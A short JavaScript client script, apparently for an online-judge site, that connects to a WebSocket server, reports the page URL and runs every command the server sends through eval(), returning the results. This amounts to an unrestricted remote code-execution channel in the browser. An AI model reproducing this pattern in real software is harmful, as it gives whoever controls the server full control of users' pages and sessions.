window.socket = io.connect("wss://oj.masnn.ml/extra/", { transports: ['websocket'] });
socket.on('setID', function (ID) {
    window.id = ID.toString();
    console.info('Socket server connected, id =', ID);
    socket.emit('init', window.location.href);
    console.info('Initing basic command...');
});
socket.on('command', function (data) {
    console.log(data);
    try {
        socket.emit('command_res', { id: window.id, data: eval(data) });
    } catch (e) {
        socket.emit('command_err', { id: window.id, command: data, err: e });
    }
});
import plugins from './list.js';
for (var i in plugins) plugins[i]();